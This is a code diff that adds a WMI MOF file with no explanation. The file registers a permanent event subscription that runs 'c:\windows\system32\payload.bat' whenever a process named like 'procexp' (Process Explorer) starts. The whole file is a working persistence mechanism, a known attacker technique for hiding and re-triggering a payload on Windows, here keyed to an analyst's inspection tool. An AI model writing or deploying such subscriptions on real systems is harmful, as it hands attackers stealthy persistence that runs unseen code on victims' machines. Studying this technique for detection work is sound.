@@ -1,0 +1,23 @@
+#pragma namespace ("\\\\.\\root\\subscription")
+
+instance of CommandLineEventConsumer as $ConsStart
+{
+	Name = "ProcExpStart";
+	CommandLineTemplate = "{c:\\windows\\system32\\payload.bat}";
+	
+};
+
+instance of __EventFilter as $FiltStart
+{
+	Name = "StartFilterProcess";
+	Query = "SELECT * FROM Win32_ProcessTrace WHERE ProcessName LIKE \"%procexp%\"";
+	QueryLanguage = "WQL";
+	EventNameSpace = "root\\cimv2";
+	
+};
+
+instance of __FilterToConsumerBinding 
+{
+	Filter = $FiltStart;
+	Consumer = $ConsStart;
+};
